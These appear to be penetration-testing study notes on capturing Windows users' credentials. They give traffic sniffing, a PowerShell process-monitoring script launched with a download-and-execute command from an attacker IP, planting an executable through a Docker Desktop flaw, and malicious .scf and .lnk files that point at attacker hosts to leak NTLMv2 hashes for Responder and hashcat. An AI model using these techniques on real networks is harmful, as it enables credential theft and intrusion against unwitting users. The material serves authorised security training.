# Interacting with Users — Credential Theft Techniques

Users are often the weakest link. Once local privesc options are exhausted, targeting user behavior through passive credential capture or planted malicious files is a viable path forward.

---

## 1. Traffic Capture

**If Wireshark is installed:** Npcap's "Restrict driver access to Administrators" option is off by default, meaning unprivileged users may be able to capture traffic.

**Check for Wireshark and attempt capture** — particularly valuable on shared hosts where other users are active. May capture cleartext credentials from protocols like FTP, HTTP, telnet, etc.

**On your attack machine:**
- **[net-creds](https://github.com/DanMcInerney/net-creds)** — sniff credentials/hashes from a live interface or pcap file
- **tcpdump** — passive capture for later analysis
- **Wireshark/pcap** — run during assessment, analyze offline

---

## 2. Process Command Line Monitoring

Scheduled tasks, scripts, or users may pass credentials as command-line arguments. This PowerShell snippet polls for new processes every second and diffs the output:

```powershell
while($true)
{
  $process = Get-WmiObject Win32_Process | Select-Object CommandLine
  Start-Sleep 1
  $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
  Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```

**Execute remotely from attack host:**
```powershell
IEX (iwr 'http://10.10.10.205/procmon.ps1')
```

**Example catch:**
```
net use T: \\sql02\backups /user:inlanefreight\sqlsvc My4dm1nP@s5w0Rd
```
→ Plaintext domain user credentials surfaced from a scheduled task.

---

## 3. Vulnerable Services Requiring User Interaction

Some application vulnerabilities trigger on user interaction rather than direct exploitation — still valid for long-term assessments.

**Example — CVE-2019-15752 (Docker Desktop < 2.1.0.1):**
- On startup or `docker login`, Docker looks for binaries like `docker-credential-wincred.exe` in `C:\ProgramData\DockerDesktop\version-bin\`
- That directory was world-writable (`BUILTIN\Users` full access)
- Planting a malicious executable there → runs as the user who starts Docker or authenticates

**Strategy:** Plant the payload during a long-term assessment and monitor for execution.

---

## 4. SCF File on a File Share (Hash Capture)

A **Shell Command File (.scf)** with a UNC path `IconFile` forces Windows Explorer to initiate an SMB authentication when a user browses the folder — leaking their NTLMv2 hash.

### Create the malicious .scf file
Name it with `@` at the start (e.g. `@Inventory.scf`) so it sorts to the top of the directory and triggers immediately when the share is browsed:

```
[Shell]
Command=2
IconFile=\\10.10.14.3\share\legit.ico
[Taskbar]
Command=ToggleDesktop
```
Drop this into a heavily-used file share.

### Start Responder on attack host
```bash
sudo responder -w -v -I tun0
```
When a user browses the folder → NTLMv2 hash captured:
```
[SMB] NTLMv2-SSP Username : WINLPE-SRV01\Administrator
[SMB] NTLMv2-SSP Hash     : Administrator::WINLPE-SRV01:<hash>
```

### Crack the hash offline
```bash
hashcat -m 5600 hash /usr/share/wordlists/rockyou.txt
```

---

## 5. Malicious .lnk File (Server 2019+)

SCF files no longer work on **Windows Server 2019**. Use a malicious `.lnk` file instead — same concept, same hash capture outcome.

### Generate with PowerShell
```powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\legit.lnk")
$lnk.TargetPath = "\\<attackerIP>\@pwn.png"
$lnk.WindowStyle = 1
$lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
$lnk.Description = "Browsing to the directory triggers auth request."
$lnk.HotKey = "Ctrl+Alt+O"
$lnk.Save()
```

Drop the `.lnk` file on a heavily accessed share → Responder captures the NTLMv2 hash when a user browses the directory.

Alternative tool: **[Lnkbomb](https://github.com/dievus/lnkbomb)**

---

## Key Takeaways

| Technique | Target Condition | Outcome |
|---|---|---|
| Traffic capture (Wireshark/tcpdump) | Wireshark/Npcap installed; multi-user host | Cleartext creds from network protocols |
| Process CLI monitoring | Scheduled tasks/scripts with inline creds | Plaintext credentials |
| Vulnerable app + user trigger | Docker Desktop < 2.1.0.1 (or similar) | Code execution on user interaction |
| Malicious SCF on share | Write access to a browsed share; pre-Server 2019 | NTLMv2 hash → offline crack |
| Malicious .lnk on share | Write access to a browsed share; Server 2019+ | NTLMv2 hash → offline crack |

Place malicious files with names that blend in (`@Inventory.scf`, `@Reports.lnk`) and sort to the top of directories with `@` prefix to maximize trigger likelihood.